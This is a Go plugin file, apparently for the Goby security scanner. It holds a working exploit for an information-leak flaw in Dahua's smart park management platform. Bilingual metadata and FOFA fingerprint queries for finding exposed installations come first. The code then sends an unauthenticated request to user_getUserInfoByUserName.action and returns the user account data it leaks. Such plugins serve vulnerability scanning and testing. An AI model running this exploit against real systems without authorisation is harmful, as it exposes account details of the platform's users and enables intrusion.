package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS user_getUserInfoByUserName.action information leakage vulnerability",
    "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies to realize the digital upgrade of park management, improve security levels, improve work efficiency, and manage Cost reduction.</p><p>The attacker reads sensitive system information through user_getUserInfoByUserName.action.</p>",
    "Impact": "<p>The attacker reads sensitive system information through user_getUserInfoByUserName.action.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability temporarily, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.dahuatech.com/product/info/5609.html\">https://www.dahuatech.com/product/info/5609.html</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "Product": "dahua-Smart-Park-GMP",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 user_getUserInfoByUserName.action 信息泄漏漏洞",
            "Product": "dahua-智慧园区综合管理平台",
            "Description": "<p>大华智慧园区解决方案围绕运营管理、综合安防、便捷通行、协同办公等多个业务领域展开，依托AI、物联网、大数据技术实现园区管理数字化升级，实现安全等级提升、工作效率提升、管理成本下降。</p><p>攻击者通过 user_getUserInfoByUserName.action 读取系统敏感信息。</p>",
            "Recommendation": "<p>1、官方暂已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.dahuatech.com/product/info/5609.html\" target=\"_blank\">https://www.dahuatech.com/product/info/5609.html</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Dahua DSS user_getUserInfoByUserName.action information leakage vulnerability",
            "Product": "dahua-Smart-Park-GMP",
            "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies to realize the digital upgrade of park management, improve security levels, improve work efficiency, and manage Cost reduction.</p><p>The attacker reads sensitive system information through user_getUserInfoByUserName.action.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability temporarily, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.dahuatech.com/product/info/5609.html\" target=\"_blank\">https://www.dahuatech.com/product/info/5609.html</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>The attacker reads sensitive system information through user_getUserInfoByUserName.action.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "GobyQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "Author": "1171373465@qq.com",
    "Homepage": "https://www.dahuatech.com/product/info/5609.html",
    "DisclosureDate": "2022-03-23",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "userName",
            "type": "input",
            "value": "system",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.5",
    "PostTime": "2023-08-13",
    "PocId": "10262"
}`
	sendPayloaddsoalkwoiel1 := func(hostInfo *httpclient.FixUrl, url, param string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(url)
		if param != "" {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.Data = param
		}
		cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			url := "/admin/user_getUserInfoByUserName.action?userName=system"
			resp, err := sendPayloaddsoalkwoiel1(hostInfo, url, "")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "lastUpdatePasswordTime")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			userName := goutils.B2S(ss.Params["userName"])
			url := "/admin/user_getUserInfoByUserName.action?userName=" + userName
			resp, err := sendPayloaddsoalkwoiel1(expResult.HostInfo, url, "")
			if err != nil {
				expResult.Success = false
				return expResult
			}
			expResult.Success = resp.StatusCode == 200
			expResult.Output = resp.Utf8Html
			return expResult
		},
	))
}
